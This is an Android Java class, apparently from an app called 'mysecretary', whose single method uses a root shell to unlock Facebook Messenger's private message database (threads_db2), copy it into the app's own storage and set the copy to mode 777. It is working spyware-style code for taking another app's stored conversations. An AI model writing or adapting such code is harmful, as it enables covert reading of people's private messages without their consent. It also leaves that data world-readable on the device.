package com.wish.mysecretary;

import android.util.Log;

import java.io.OutputStreamWriter;

public class GetFBDB {
    public static void copy(){
        Runtime ex= Runtime.getRuntime();
        String su="su";
        String line="/data/data/com.facebook.orca/databases/threads_db2";
        String ATC="/data/data/com.wish.mysecretary/databases/";
        try{
            Process rumsum=ex.exec(su);
            int exitval=0;
            final OutputStreamWriter out=new OutputStreamWriter(rumsum.getOutputStream());

            out.write("busybox chmod o+rw "+line+"\n");
            out.flush();

            //out.write("busybox mkdir "+ATC+"\n");
            //out.flush();

            out.write("busybox cp "+line+" "+ATC+"FB\n");
            out.flush();

            out.write("busybox chmod 777 "+ATC+"FB\n");
            out.flush();

            out.write("exit\n");
            out.flush();

            exitval=rumsum.waitFor();
            if(exitval==0){
                Log.e("Debug", "Successfully");
            }


        }catch (Exception e){
            Log.e("dubug","Fails to su");
        }

    }

}
